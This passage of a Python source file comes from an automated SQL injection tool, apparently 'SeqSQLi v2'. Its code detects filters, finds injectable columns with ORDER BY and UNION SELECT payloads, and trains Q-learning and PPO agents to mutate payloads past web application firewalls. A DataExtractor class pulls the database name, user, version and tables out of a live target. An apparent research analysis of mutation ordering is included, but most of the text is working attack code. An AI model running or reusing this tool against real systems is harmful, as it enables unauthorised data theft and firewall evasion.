            is_blocked = self._is_blocked(resp, status)
            same_as_baseline = self._is_same_as_baseline(resp)

            probe_results[name] = {
                "error": is_err, "blocked": is_blocked,
                "same_baseline": same_as_baseline, "len": len(resp)
            }

            if is_blocked:
                filters_detected.add(name)
            elif is_err:
                if name == "space":
                    filters_detected.add(name)
                elif name in ("union", "select"):
                    if name == "union" and "union" not in resp.lower():
                        filters_detected.add(name)
                    elif name == "select" and "select" not in resp.lower():
                        filters_detected.add(name)
                elif name == "comment" and "/**/" not in resp:
                    filters_detected.add(name)
                elif name == "dash_comment":
                    filters_detected.add(name)

        resp_dash, _ = send_request(self.target, f"1{q}{c}")
        time.sleep(REQUEST_DELAY)
        resp_with_dash, _ = send_request(self.target, f"1-{q}{c}")
        time.sleep(REQUEST_DELAY)

        hint_probe, _ = send_request(self.target, f"test-string{q}")
        time.sleep(REQUEST_DELAY)
        if "test-string" in hint_probe.lower() and "teststring" in hint_probe.lower():
            filters_detected.add("dash_comment")
            self.log(f"Detected: individual dash '-' stripping")

        self.log(f"Filter probes: {probe_results}")
        self.log(f"Filters detected: {filters_detected}")

        has_union   = "union" in filters_detected
        has_select  = "select" in filters_detected
        has_comment = "comment" in filters_detected
        has_space   = "space" in filters_detected
        has_or      = "or" in filters_detected
        has_and     = "and" in filters_detected
        has_dash    = "dash_comment" in filters_detected

        if not filters_detected:
            self.target.filter_type = "none"
        elif has_or and not has_union and not has_comment:
            self.target.filter_type = "or_and"
        elif (has_comment or has_space) and (has_or or has_and):
            self.target.filter_type = "comments_spaces_or_and"
        elif has_union or has_select:
            if has_comment or has_space:
                self.target.filter_type = "union_select_comments_spaces"
            else:
                self.target.filter_type = "union_select_combined"
        elif has_comment or has_space:
            self.target.filter_type = "comments_spaces_or_and"
        else:
            self.target.filter_type = "unknown"

        self.log(f"Filter type: {self.target.filter_type}")

    def _build_probe_payload(self, keyword_payload: str) -> str:
        ft = self.target.filter_type
        if ft == "none":
            return keyword_payload

        result = keyword_payload
        if ft in ("union_select_comments_spaces", "union_select_combined"):
            result = MutationEngine.case_variation(result)
            result = MutationEngine.newline_space(result)
        elif ft == "comments_spaces_or_and":
            result = MutationEngine.newline_space(result)
            result = MutationEngine.nested_or(result)
            result = MutationEngine.nested_and(result)
        elif ft == "or_and":
            result = MutationEngine.nested_or(result)
            result = MutationEngine.nested_and(result)
        return result

    def _detect_columns(self):
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        ft = self.target.filter_type

        is_quote_close = (suffix == "QUOTE_CLOSE")

        if not is_quote_close:
            last_success_n = 0
            for n in range(1, 20):
                raw = f"1{q}{c} ORDER BY {n}{suffix}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                is_err = self._has_sql_error(resp)
                is_blocked = self._is_blocked(resp, status)

                if is_err or is_blocked:
                    if last_success_n > 0:
                        self.target.columns = last_success_n
                        self.log(f"Column count: {last_success_n} (ORDER BY {n} failed)")
                        return
                    elif n == 1:
                        self.log(f"ORDER BY 1 failed, trying UNION SELECT approach...")
                        break
                    else:
                        self.target.columns = n - 1
                        self.log(f"Column count: {n - 1} (ORDER BY {n} failed)")
                        return
                else:
                    last_success_n = n
        else:
            self.log(f"QUOTE_CLOSE suffix: skipping ORDER BY, going to UNION SELECT...")

        if not is_quote_close:
            for n in range(1, 15):
                cols = ",".join(["NULL"] * n)
                raw = f"0{q}{c} UNION SELECT {cols}{suffix}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                is_err = self._has_sql_error(resp)
                is_blocked = self._is_blocked(resp, status)

                if not is_err and not is_blocked and not self._is_same_as_baseline(resp, threshold=20):
                    self.target.columns = n
                    self.log(f"Column count: {n} (UNION SELECT NULL succeeded)")
                    return

                if not is_err and not is_blocked:
                    marker_cols = []
                    for i in range(1, n + 1):
                        marker_cols.append(f"0x{f'PROBE{i}'.encode().hex()}")
                    raw2 = f"0{q}{c} UNION SELECT {','.join(marker_cols)}{suffix}"
                    payload2 = self._build_probe_payload(raw2)
                    resp2, _ = send_request(self.target, payload2)
                    time.sleep(REQUEST_DELAY)

                    if any(f"PROBE{i}" in resp2 for i in range(1, n + 1)):
                        self.target.columns = n
                        self.log(f"Column count: {n} (confirmed via marker reflection)")
                        return

        if q:
            self.log(f"Trying column detection with quote-closing suffix...")
            for n in range(1, 10):
                cols_parts = []
                for i in range(1, n + 1):
                    if i == n:
                        cols_parts.append(f"{q}{i}")
                    else:
                        cols_parts.append(str(i))
                raw = f"0{q}{c} UNION SELECT {','.join(cols_parts)}"
                payload = self._build_probe_payload(raw)
                resp, status = send_request(self.target, payload)
                time.sleep(REQUEST_DELAY)

                if not self._has_sql_error(resp) and not self._is_blocked(resp, status):
                    if not self._is_same_as_baseline(resp, threshold=20):
                        self.target.columns = n
                        self.log(f"Column count: {n} (with quote-closing last column)")
                        return
                    marker_parts = []
                    for i in range(1, n + 1):
                        if i == n:
                            marker_parts.append(f"{q}{i}")
                        else:
                            marker_parts.append(f"0x{f'PROBE{i}'.encode().hex()}")
                    raw2 = f"0{q}{c} UNION SELECT {','.join(marker_parts)}"
                    payload2 = self._build_probe_payload(raw2)
                    resp2, _ = send_request(self.target, payload2)
                    time.sleep(REQUEST_DELAY)
                    if any(f"PROBE{i}" in resp2 for i in range(1, n)):
                        self.target.columns = n
                        self.log(f"Column count: {n} (quote-close + marker confirmed)")
                        return

        self.target.columns = 3
        self.log(f"Column count: defaulting to {self.target.columns}")

    def _detect_injectable_columns(self):
        if self.target.columns == 0:
            return

        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns

        is_quote_close = (suffix == "QUOTE_CLOSE")

        if not is_quote_close:
            cols = []
            for i in range(1, n + 1):
                cols.append(f"0x{f'DEADCOL{i}'.encode().hex()}")
            raw = f"0{q}{c} UNION SELECT {','.join(cols)}{suffix}"
            payload = self._build_probe_payload(raw)
            resp, status = send_request(self.target, payload)
            time.sleep(REQUEST_DELAY)

            injectable = []
            for i in range(1, n + 1):
                if f"DEADCOL{i}" in resp:
                    injectable.append(i)

            if injectable:
                self.target.injectable_cols = injectable
                self.log(f"Injectable columns: {self.target.injectable_cols}")
                return

        cols2 = []
        for i in range(1, n + 1):
            if i == n:
                cols2.append(f"{q}{i}")
            else:
                cols2.append(f"0x{f'DEADCOL{i}'.encode().hex()}")
        raw2 = f"0{q}{c} UNION SELECT {','.join(cols2)}"
        payload2 = self._build_probe_payload(raw2)
        resp2, _ = send_request(self.target, payload2)
        time.sleep(REQUEST_DELAY)

        injectable = []
        for i in range(1, n):
            if f"DEADCOL{i}" in resp2:
                injectable.append(i)

        self.target.injectable_cols = injectable if injectable else list(range(2, min(n + 1, 4)))
        self.log(f"Injectable columns: {self.target.injectable_cols}")

    def _build_base_payload(self):
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns

        if n == 0:
            if self.target.method == "POST":
                self.target.base_payload = f"admin{q}{c} {suffix}"
            else:
                self.target.base_payload = f"1{q}{c} AND 1=1{suffix}"
            return

        cols = ",".join(str(i) for i in range(1, n + 1))

        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00") and q)
        )

        if needs_quote_close and q:
            col_parts = []
            for i in range(1, n + 1):
                if i == n:
                    col_parts.append(f"{q}{i}")
                else:
                    col_parts.append(str(i))
            self.target.base_payload = f"0{q}{c} UNION SELECT {','.join(col_parts)}"
            self.target.suffix = "QUOTE_CLOSE"
        else:
            self.target.base_payload = f"0{q}{c} UNION SELECT {cols}{suffix}"

        self.log(f"Base payload: {self.target.base_payload}")


# =============================================================================
# STATE ENCODER  (was: seqsqli/rl/state.py)
# =============================================================================
def extract_features(payload: str) -> Tuple:
    p = payload.lower()
    return (
        1 if "/**/" in p else 0,
        1 if ("%55" in p or "%53" in p) else 0,
        1 if "%0a" in p else 0,
        1 if "/*!" in p else 0,
        1 if ("%09" in p or "%0b" in p or "%0c" in p) else 0,
        1 if ("||" in p or "&&" in p) else 0,
        1 if "0x" in p else 0,
        1 if "%bf" in p else 0,
        1 if ("select" in p and "(" in p.split("select", 1)[-1][:20]) else 0,
        1 if "%a0" in p else 0,
        1 if "%23" in p else 0,
        1 if ("uniunion" in p or "selselecte" in p
              or "UNIunion" in p or "SELselect" in p) else 0,
        1 if "/*&" in p else 0,
        1 if ("distinct" in p or "DISTINCT" in p) else 0,
    )


def encode_state(last_result: str, last_action: str,
                 step: int, payload: str) -> Tuple:
    return (last_result, last_action, min(step // 3, 4), *extract_features(payload))


# =============================================================================
# Q-LEARNING  (was: seqsqli/rl/qlearning.py)
# =============================================================================
Q: Dict[Tuple, float] = defaultdict(float)

REWARD_TABLE = {
    "SUCCESS":      10.0,
    "SQL_ERROR":     0.5,
    "FILTERED":     -1.0,
    "UNKNOWN":      -0.5,
    "WAF_BLOCKED":  -2.0,
    "SERVER_ERROR": -1.5,
}


def choose_action(state: Tuple, epsilon: float,
                  filter_type: str = "none") -> str:
    if random.random() < epsilon:
        hints = FILTER_MUTATION_HINTS.get(filter_type, ACTION_LIST[:10])
        pool = hints * 2 + ACTION_LIST
        return random.choice(pool)
    return max(ACTION_LIST, key=lambda a: Q[(state, a)])


def update_Q(state: Tuple, action: str,
             reward: float, next_state: Tuple) -> None:
    best_next = max(Q[(next_state, a)] for a in ACTION_LIST)
    Q[(state, action)] += ALPHA * (reward + GAMMA * best_next - Q[(state, action)])


def get_reward(result: str, step: int) -> float:
    return REWARD_TABLE.get(result, -1.0) - (STEP_PENALTY * step)


def save_q_table(path: str = QTABLE_PATH) -> None:
    data = [{"state": list(s), "action": a, "value": v}
            for (s, a), v in Q.items()]
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"[*] Q-table saved: {path} ({len(data)} entries)")


def load_q_table(path: str = QTABLE_PATH) -> None:
    global Q
    try:
        with open(path) as f:
            data = json.load(f)
        Q.clear()
        for item in data:
            Q[(tuple(item["state"]), item["action"])] = float(item["value"])
        print(f"[*] Q-table loaded: {path} ({len(Q)} entries)")
    except FileNotFoundError:
        print(f"[!] No Q-table at {path}, starting fresh.")


# =============================================================================
# GYMNASIUM ENV  (was: seqsqli/rl/env.py)
# =============================================================================
PPO_REWARD_TABLE = {
    "SUCCESS":      10.0,
    "SQL_ERROR":     0.5,
    "FILTERED":     -1.0,
    "UNKNOWN":      -0.5,
    "WAF_BLOCKED":  -2.0,
    "SERVER_ERROR": -1.5,
    "STAGNANT":     -1.5,
}

_N_ACTIONS  = len(ACTION_LIST)
_N_FEATURES = 14
OBS_DIM     = _N_FEATURES + _N_ACTIONS + 1


class SeqSQLiEnv(gym.Env):
    """Gymnasium environment for SQL injection WAF bypass via mutation sequences."""

    metadata = {"render_modes": []}

    def __init__(self, target: TargetProfile):
        super().__init__()
        self.target = target

        self.action_space = spaces.Discrete(_N_ACTIONS)
        self.observation_space = spaces.Box(
            low=0.0, high=1.0,
            shape=(OBS_DIM,),
            dtype=np.float32,
        )

        self._payload    = ""
        self._step_count = 0
        self._last_action_idx = -1

    def reset(self, *, seed=None, options=None):
        super().reset(seed=seed)
        self._payload         = self.target.base_payload
        self._step_count      = 0
        self._last_action_idx = -1
        return self._obs(), {}

    def step(self, action_idx: int):
        action  = ACTION_LIST[action_idx]
        mutated = MUTATIONS[action](self._payload)

        if mutated == self._payload:
            reward = PPO_REWARD_TABLE["STAGNANT"] - STEP_PENALTY * self._step_count
            self._step_count += 1
            self._last_action_idx = action_idx
            truncated = self._step_count >= MAX_STEPS
            return self._obs(), reward, False, truncated, {"result": "STAGNANT"}

        resp_text, status = send_request(self.target, mutated)
        result = classify_response(resp_text, status)
        reward = PPO_REWARD_TABLE.get(result, -1.0) - STEP_PENALTY * self._step_count

        self._payload         = mutated
        self._step_count     += 1
        self._last_action_idx = action_idx

        terminated = result == "SUCCESS"
        truncated  = self._step_count >= MAX_STEPS

        return self._obs(), reward, terminated, truncated, {"result": result}

    def _obs(self) -> np.ndarray:
        features = np.array(extract_features(self._payload), dtype=np.float32)

        action_onehot = np.zeros(_N_ACTIONS, dtype=np.float32)
        if self._last_action_idx >= 0:
            action_onehot[self._last_action_idx] = 1.0

        step_norm = np.array([self._step_count / MAX_STEPS], dtype=np.float32)

        return np.concatenate([features, action_onehot, step_norm])

    def get_payload(self) -> str:
        return self._payload


# =============================================================================
# EVALUATION + ORDERING ANALYSIS  (was: seqsqli/rl/evaluate.py)
# =============================================================================
def evaluate(episode_logs: List[dict]) -> None:
    total = len(episode_logs)
    successes = [e for e in episode_logs if e["success"]]

    print(f"\n{'='*60}")
    print(f" TRAINING RESULTS")
    print(f"{'='*60}")
    print(f"  Total episodes     : {total}")
    print(f"  Successful bypass  : {len(successes)} ({len(successes)/total*100:.1f}%)")

    if successes:
        avg_steps = sum(e["steps"] for e in successes) / len(successes)
        print(f"  Avg steps (success): {avg_steps:.2f}")

        all_actions = []
        for e in successes:
            all_actions.extend(e["sequence"])
        top = Counter(all_actions).most_common(5)
        print(f"\n  Top mutations:")
        for action, count in top:
            print(f"    {action:<22} : {count}")

        shortest = min(successes, key=lambda e: e["steps"])
        print(f"\n  Shortest bypass:")
        print(f"    Steps    : {shortest['steps']}")
        print(f"    Sequence : {' -> '.join(shortest['sequence'])}")
        print(f"    Payload  : {shortest['final_payload']}")


def greedy_eval(target: TargetProfile) -> None:
    payload = target.base_payload
    state = encode_state("INIT", "none", 0, payload)

    print(f"\n[*] Greedy evaluation:")
    for step in range(MAX_STEPS):
        action = max(ACTION_LIST, key=lambda a: Q[(state, a)])
        mutated = MUTATIONS[action](payload)
        resp, status = send_request(target, mutated)
        result = classify_response(resp, status)
        next_state = encode_state(result, action, step + 1, mutated)

        print(f"  Step {step+1}: {action:<22} -> {result}")
        print(f"         {mutated[:100]}")

        if result == "SUCCESS":
            print("  *** BYPASS SUCCESSFUL ***")
            break
        payload = mutated
        state = next_state
        time.sleep(REQUEST_DELAY)


def analyze_q_table(top_n: int = 15) -> None:
    if not Q:
        print("[!] Q-table is empty.")
        return
    print(f"\n  Top {top_n} Q-values:")
    sorted_q = sorted(Q.items(), key=lambda x: x[1], reverse=True)[:top_n]
    for (state, action), value in sorted_q:
        print(f"    {action:<22} | Q={value:>7.3f} | state={state}")


def analyze_ordering(episode_logs: List[dict], save_path: str = None) -> dict:
    """RQ3: Analyze how mutation ORDERING affects WAF bypass."""

    successes = [e for e in episode_logs if e["success"]]
    failures  = [e for e in episode_logs if not e["success"]]
    total_eps = len(episode_logs)

    # 1. First-step
    first_step_success: Dict[str, int] = Counter()
    first_step_total:   Dict[str, int] = Counter()
    for ep in episode_logs:
        seq = ep["sequence"]
        if not seq:
            continue
        first = seq[0]
        first_step_total[first] += 1
        if ep["success"]:
            first_step_success[first] += 1

    first_step_sr = {}
    for action, total in first_step_total.items():
        sr = first_step_success[action] / total * 100
        first_step_sr[action] = {
            "success_rate": round(sr, 1),
            "success_count": first_step_success[action],
            "total_count":   total,
        }
    first_step_sr = dict(
        sorted(first_step_sr.items(), key=lambda x: x[1]["success_rate"], reverse=True)
    )

    # 2. Bigrams
    bigram_success: Dict[str, int] = Counter()
    bigram_total:   Dict[str, int] = Counter()
    for ep in episode_logs:
        seq = ep["sequence"]
        for i in range(len(seq) - 1):
            pair = f"{seq[i]} -> {seq[i+1]}"
            bigram_total[pair] += 1
            if ep["success"]:
                bigram_success[pair] += 1

    bigram_sr = {}
    for pair, total in bigram_total.items():
        if total < 2:
            continue
        sr = bigram_success[pair] / total * 100
        bigram_sr[pair] = {
            "success_rate":  round(sr, 1),
            "success_count": bigram_success[pair],
            "total_count":   total,
        }
    bigram_sr = dict(
        sorted(bigram_sr.items(), key=lambda x: x[1]["success_rate"], reverse=True)
    )

    # 3. Reversed pairs
    reversed_pairs = {}
    seen = set()
    for pair in bigram_sr:
        if pair in seen:
            continue
        a, b = pair.split(" -> ")
        rev_pair = f"{b} -> {a}"
        if rev_pair in bigram_sr and rev_pair not in seen:
            sr_fwd = bigram_sr[pair]["success_rate"]
            sr_rev = bigram_sr[rev_pair]["success_rate"]
            diff   = round(sr_fwd - sr_rev, 1)
            reversed_pairs[pair] = {
                "forward":          {"pair": pair,     "success_rate": sr_fwd,
                                     "count": bigram_sr[pair]["total_count"]},
                "reversed":         {"pair": rev_pair, "success_rate": sr_rev,
                                     "count": bigram_sr[rev_pair]["total_count"]},
                "sr_difference":    diff,
                "ordering_matters": abs(diff) >= 10.0,
            }
            seen.add(pair)
            seen.add(rev_pair)

    reversed_pairs = dict(
        sorted(reversed_pairs.items(),
               key=lambda x: abs(x[1]["sr_difference"]), reverse=True)
    )

    # 4. Position sensitivity
    pos_success: Dict[str, Dict[str, int]] = {}
    pos_total:   Dict[str, Dict[str, int]] = {}
    for ep in episode_logs:
        seq = ep["sequence"]
        for i, action in enumerate(seq):
            pos = str(i + 1) if i < 2 else "3+"
            if action not in pos_success:
                pos_success[action] = Counter()
                pos_total[action]   = Counter()
            pos_total[action][pos]   += 1
            if ep["success"]:
                pos_success[action][pos] += 1

    position_sensitivity = {}
    for action in pos_total:
        entry = {}
        for pos in ["1", "2", "3+"]:
            if pos in pos_total[action] and pos_total[action][pos] >= 2:
                sr = pos_success[action][pos] / pos_total[action][pos] * 100
                entry[f"pos_{pos}"] = {
                    "success_rate": round(sr, 1),
                    "count":        pos_total[action][pos],
                }
        if entry and len(entry) >= 2:
            position_sensitivity[action] = entry

    # ---- Print report ----
    print(f"\n{'='*60}")
    print(f" RQ3 — MUTATION ORDERING ANALYSIS")
    print(f"{'='*60}")

    print(f"\n  [1] First-Step Success Rate (which mutation to apply FIRST?)")
    print(f"  {'Action':<22} | {'SR':>6} | {'Succ':>5} / {'Total':>5}")
    print(f"  {'-'*50}")
    for action, d in list(first_step_sr.items())[:10]:
        bar = "█" * int(d["success_rate"] / 10)
        print(f"  {action:<22} | {d['success_rate']:>5.1f}% | "
              f"{d['success_count']:>5} / {d['total_count']:>5}  {bar}")

    print(f"\n  [2] Top Bigram Sequences (A -> B success rate)")
    print(f"  {'Sequence':<35} | {'SR':>6} | {'Count':>5}")
    print(f"  {'-'*55}")
    for pair, d in list(bigram_sr.items())[:10]:
        bar = "█" * int(d["success_rate"] / 10)
        print(f"  {pair:<35} | {d['success_rate']:>5.1f}% | "
              f"{d['total_count']:>5}  {bar}")

    print(f"\n  [3] Ordering Effect: A->B  vs  B->A")
    print(f"  {'Forward':<25} {'SR':>6}  |  {'Reversed':<25} {'SR':>6}  | {'Diff':>6} | {'Matters?':>8}")
    print(f"  {'-'*80}")
    shown = 0
    for pair, d in reversed_pairs.items():
        fwd = d["forward"]
        rev = d["reversed"]
        flag = "✓ YES" if d["ordering_matters"] else "  no"
        print(f"  {fwd['pair']:<25} {fwd['success_rate']:>5.1f}%  |  "
              f"  {rev['pair']:<25} {rev['success_rate']:>5.1f}%  | "
              f"{d['sr_difference']:>+6.1f}% | {flag}")
        shown += 1
        if shown >= 10:
            break

    if not reversed_pairs:
        print(f"  (not enough data — run more episodes for reversed-pair comparison)")

    print(f"\n  [4] Position Sensitivity (does position in sequence matter?)")
    print(f"  {'Action':<22} | {'pos_1':>8} | {'pos_2':>8} | {'pos_3+':>8} | {'Δ(1 vs 2)':>10}")
    print(f"  {'-'*70}")
    for action, d in list(position_sensitivity.items())[:12]:
        p1  = d.get("pos_1",  {}).get("success_rate", "  N/A")
        p2  = d.get("pos_2",  {}).get("success_rate", "  N/A")
        p3p = d.get("pos_3+", {}).get("success_rate", "  N/A")
        if isinstance(p1, float) and isinstance(p2, float):
            delta = f"{p1 - p2:>+.1f}%"
        else:
            delta = "   N/A"
        p1_s  = f"{p1:>6.1f}%" if isinstance(p1, float) else f"{p1:>8}"
        p2_s  = f"{p2:>6.1f}%" if isinstance(p2, float) else f"{p2:>8}"
        p3p_s = f"{p3p:>6.1f}%" if isinstance(p3p, float) else f"{p3p:>8}"
        print(f"  {action:<22} | {p1_s:>8} | {p2_s:>8} | {p3p_s:>8} | {delta:>10}")

    ordering_evidence = [p for p, d in reversed_pairs.items() if d["ordering_matters"]]
    print(f"\n  VERDICT:")
    if ordering_evidence:
        print(f"  Ordering matters (≥10% SR gap) in {len(ordering_evidence)} out of "
              f"{len(reversed_pairs)} observed pairs.")
        print(f"  Key pairs where order is critical:")
        for p in ordering_evidence[:5]:
            d  = reversed_pairs[p]
            print(f"    {d['forward']['pair']:<30} SR={d['forward']['success_rate']}%  vs  "
                  f"{d['reversed']['pair']:<30} SR={d['reversed']['success_rate']}%")
    else:
        print(f"  No reversed pairs with ≥10% gap found yet.")
        print(f"  Try running with more episodes (e.g. --episodes 500) for stronger evidence.")

    report = {
        "total_episodes":      total_eps,
        "successful_episodes": len(successes),
        "first_step":          first_step_sr,
        "bigrams":             bigram_sr,
        "reversed_pairs":      reversed_pairs,
        "position_sensitivity": position_sensitivity,
        "ordering_matters_count": len(ordering_evidence),
    }

    if save_path:
        with open(save_path, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n[*] Ordering analysis saved to: {save_path}")

    return report


# =============================================================================
# Q-LEARNING TRAINING LOOP  (was: seqsqli/rl/train.py)
# =============================================================================
def train(target: TargetProfile, episodes: int) -> List[dict]:
    filter_type  = target.filter_type
    base_payload = target.base_payload
    epsilon      = EPSILON
    episode_logs: List[dict] = []

    print("=" * 60)
    print(f" SeqSQLi v2 — Training")
    print(f" URL         : {target.url}")
    print(f" Filter type : {filter_type}")
    print(f" Columns     : {target.columns}")
    print(f" Base payload: {base_payload}")
    print(f" Episodes    : {episodes}")
    print("=" * 60)

    for ep in range(episodes):
        payload      = base_payload
        state        = encode_state("INIT", "none", 0, payload)
        total_reward = 0.0
        step_log     = []
        success      = False

        for step in range(MAX_STEPS):
            action  = choose_action(state, epsilon, filter_type)
            mutated = MUTATIONS[action](payload)

            resp_text, status = send_request(target, mutated)
            result            = classify_response(resp_text, status)
            reward            = get_reward(result, step + 1)

            next_state = encode_state(result, action, step + 1, mutated)
            update_Q(state, action, reward, next_state)

            step_log.append({
                "step":    step + 1,
                "action":  action,
                "payload": mutated[:150],
                "result":  result,
                "reward":  round(reward, 2),
            })

            total_reward += reward
            payload = mutated
            state   = next_state

            if result == "SUCCESS":
                success = True
                break

            time.sleep(REQUEST_DELAY)

        epsilon = max(epsilon * EPSILON_DECAY, EPSILON_MIN)

        episode_logs.append({
            "episode":       ep + 1,
            "steps":         len(step_log),
            "total_reward":  round(total_reward, 2),
            "success":       success,
            "final_result":  step_log[-1]["result"] if step_log else "N/A",
            "sequence":      [s["action"] for s in step_log],
            "final_payload": step_log[-1]["payload"] if step_log else "",
        })

        if (ep + 1) % 10 == 0:
            recent    = episode_logs[-10:]
            sr        = sum(1 for e in recent if e["success"]) / 10 * 100
            avg_steps = sum(e["steps"] for e in recent) / 10
            avg_rew   = sum(e["total_reward"] for e in recent) / 10
            print(
                f"  Ep {ep+1:>4} | eps={epsilon:.3f} | "
                f"SR={sr:.0f}% | Steps={avg_steps:.1f} | R={avg_rew:.2f}"
            )

    return episode_logs


# =============================================================================
# PPO TRAINING  (was: seqsqli/rl/train_ppo.py)
# =============================================================================
PPO_TIMESTEPS  = 50_000
PPO_LR         = 3e-4
PPO_N_STEPS    = 128
PPO_BATCH_SIZE = 64
PPO_N_EPOCHS   = 10
PPO_GAMMA      = 0.99
PPO_CLIP_RANGE = 0.2
PPO_MODEL_PATH = "seqsqli_ppo"


class EpisodeLogCallback(BaseCallback):
    """Collects per-episode stats during PPO training."""

    def __init__(self, verbose=0):
        super().__init__(verbose)
        self.episode_logs: List[dict] = []
        self._ep_steps    = 0
        self._ep_reward   = 0.0
        self._ep_actions: List[str] = []
        self._ep_num      = 0

    def _on_step(self) -> bool:
        info      = self.locals["infos"][0]
        reward    = float(self.locals["rewards"][0])
        done      = bool(self.locals["dones"][0])
        action    = ACTION_LIST[int(self.locals["actions"][0])]
        result    = info.get("result", "UNKNOWN")

        self._ep_steps  += 1
        self._ep_reward += reward
        self._ep_actions.append(action)

        if done:
            success = result == "SUCCESS"
            self._ep_num += 1
            self.episode_logs.append({
                "episode":      int(self._ep_num),
                "steps":        int(self._ep_steps),
                "total_reward": round(float(self._ep_reward), 2),
                "success":      bool(success),
                "final_result": str(result),
                "sequence":     list(self._ep_actions),
                "final_payload": "",
            })

            if self._ep_num % 10 == 0:
                recent = self.episode_logs[-10:]
                sr     = sum(1 for e in recent if e["success"]) / 10 * 100
                avg_s  = sum(e["steps"] for e in recent) / 10
                avg_r  = sum(e["total_reward"] for e in recent) / 10
                print(f"  Ep {self._ep_num:>4} | "
                      f"SR={sr:.0f}% | Steps={avg_s:.1f} | R={avg_r:.2f}")

            self._ep_steps   = 0
            self._ep_reward  = 0.0
            self._ep_actions = []

        return True


def train_ppo(target: TargetProfile,
              timesteps: int = PPO_TIMESTEPS,
              save_path: str = PPO_MODEL_PATH) -> List[dict]:
    """Train a PPO agent against target and return episode logs."""
    env = SeqSQLiEnv(target)

    print("=" * 60)
    print(f" SeqSQLi v2 — PPO Training")
    print(f" URL         : {target.url}")
    print(f" Filter type : {target.filter_type}")
    print(f" Base payload: {target.base_payload}")
    print(f" Timesteps   : {timesteps}")
    print("=" * 60)

    callback = EpisodeLogCallback(verbose=0)

    model = PPO(
        "MlpPolicy",
        env,
        learning_rate  = PPO_LR,
        n_steps        = PPO_N_STEPS,
        batch_size     = PPO_BATCH_SIZE,
        n_epochs       = PPO_N_EPOCHS,
        gamma          = PPO_GAMMA,
        clip_range     = PPO_CLIP_RANGE,
        verbose        = 0,
        tensorboard_log= "./ppo_tensorboard/",
    )

    model.learn(total_timesteps=timesteps, callback=callback)
    model.save(save_path)
    print(f"[*] PPO model saved: {save_path}.zip")

    return callback.episode_logs


def greedy_eval_ppo(target: TargetProfile,
                    model_path: str = PPO_MODEL_PATH,
                    n_episodes: int = 50) -> List[dict]:
    """Run greedy evaluation using a saved PPO model."""
    model = PPO.load(model_path)
    env   = SeqSQLiEnv(target)
    logs: List[dict] = []

    for ep in range(n_episodes):
        obs, _ = env.reset()
        done      = False
        truncated = False
        steps     = 0
        total_r   = 0.0
        sequence: List[str] = []
        final_result = "UNKNOWN"

        while not done and not truncated:
            action_arr, _ = model.predict(obs, deterministic=True)
            action_idx    = int(action_arr)
            obs, reward, done, truncated, info = env.step(action_idx)

            steps        += 1
            total_r      += reward
            sequence.append(ACTION_LIST[action_idx])
            final_result  = info.get("result", "UNKNOWN")
            time.sleep(REQUEST_DELAY)

        logs.append({
            "episode":       ep + 1,
            "steps":         steps,
            "total_reward":  round(float(total_r), 2),
            "success":       final_result == "SUCCESS",
            "final_result":  final_result,
            "sequence":      sequence,
            "final_payload": env.get_payload(),
        })

    return logs


# =============================================================================
# DATA EXTRACTOR  (was: seqsqli/extractor.py)
# =============================================================================
class DataExtractor:
    """Extract DB content using the trained RL agent to build evasive payloads."""

    def __init__(self, target: TargetProfile, verbose: bool = True):
        self.target = target
        self.verbose = verbose

    def log(self, msg: str):
        if self.verbose:
            print(f"  [EXTRACT] {msg}")

    def _pick_inject_col(self) -> int:
        n = self.target.columns
        q = self.target.quote
        suffix = self.target.suffix

        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00")
                and q and q not in ("%bf%27",))
        )

        candidates = self.target.injectable_cols if self.target.injectable_cols else list(range(2, min(n + 1, 4)))

        if needs_quote_close and n > 1:
            candidates = [c for c in candidates if c != n]
            if not candidates:
                candidates = [max(1, n - 1)]

        return candidates[0] if candidates else 2

    def _build_extract_payload(self, sql_expr: str) -> str:
        q = self.target.quote
        c = self.target.closure
        suffix = self.target.suffix
        n = self.target.columns
        inject_col = self._pick_inject_col()

        needs_quote_close = (
            suffix == "QUOTE_CLOSE"
            or (suffix not in ("--+", "-- -", "#", "%23", ";%00")
                and q and q not in ("%bf%27",))
        )

        cols = []
        for i in range(1, n + 1):
            if i == inject_col:
                cols.append(f"CONCAT(0x7e7e53544152547e7e,({sql_expr}),0x7e7e454e447e7e)")
            elif needs_quote_close and i == n:
                cols.append(f"{q}{i}")
            else:
                cols.append(str(i))

        if needs_quote_close:
            return f"0{q}{c} UNION SELECT {','.join(cols)}"
        else:
            return f"0{q}{c} UNION SELECT {','.join(cols)}{suffix}"

    def _apply_best_mutations(self, payload: str) -> str:
        state = encode_state("INIT", "none", 0, payload)
        current = payload

        for step in range(MAX_STEPS):
            action = max(ACTION_LIST, key=lambda a: Q[(state, a)])
            mutated = MUTATIONS[action](current)

            if mutated == current:
                break

            resp, status = send_request(self.target, mutated)
            result = classify_response(resp, status)

            extracted = extract_between_markers(resp)
            if extracted is not None:
                return mutated

            if result == "SUCCESS":
                return mutated

            next_state = encode_state(result, action, step + 1, mutated)
            current = mutated
            state = next_state
            time.sleep(REQUEST_DELAY)

        return current

    def _send_extract(self, sql_expr: str) -> Optional[str]:
        raw = self._build_extract_payload(sql_expr)
        mutated = self._apply_best_mutations(raw)

        resp, status = send_request(self.target, mutated)
        data = extract_between_markers(resp)

        if data is None:
            resp, status = send_request(self.target, raw)
            data = extract_between_markers(resp)

        return data

    def get_current_db(self) -> Optional[str]:
        self.log("Extracting current database...")
        result = self._send_extract("database()")
        if result:
            self.log(f"Current database: {result}")
        else:
            self.log("Failed to extract database name")
        return result

    def get_current_user(self) -> Optional[str]:
        self.log("Extracting current user...")
        result = self._send_extract("user()")
        if result:
            self.log(f"Current user: {result}")
        return result

    def get_version(self) -> Optional[str]:
        self.log("Extracting version...")
        result = self._send_extract("version()")
        if result:
            self.log(f"Version: {result}")
        return result

    def get_tables(self, database: str = None) -> List[str]:
        if database is None:
